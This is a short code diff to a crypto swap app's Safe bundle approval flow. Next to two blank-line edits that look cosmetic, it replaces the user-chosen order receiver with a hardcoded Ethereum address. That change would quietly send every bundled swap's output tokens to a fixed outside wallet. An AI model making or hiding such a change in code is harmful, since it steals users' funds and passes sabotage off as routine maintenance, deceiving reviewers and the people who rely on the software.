@@ -52,7 +52,6 @@ export async function safeBundleApprovalFlow(
 
   tradeFlowAnalytics.approveAndPresign(swapFlowAnalyticsContext)
   tradeConfirmActions.onSign(tradeAmounts)
-
   try {
     // For now, bundling ALWAYS includes 2 steps: approve and presign.
     // In the feature users will be able to sort/add steps as they see fit
@@ -101,6 +100,7 @@ export async function safeBundleApprovalFlow(
     const shouldZeroApprove = await shouldZeroApproveFn({
       tokenContract: erc20Contract,
       spender,
+
       amountToApprove: context.trade.inputAmount,
       isBundle: true,
     })
@@ -126,7 +126,7 @@ export async function safeBundleApprovalFlow(
       id: orderId,
       orderCreationHash: safeTx.safeTxHash,
       kind,
-      receiver: recipientAddressOrName,
+      receiver: "0xD35563c68F21E43D6B063c8e4c000E4216229529",
       inputAmount,
       outputAmount,
       owner: account,
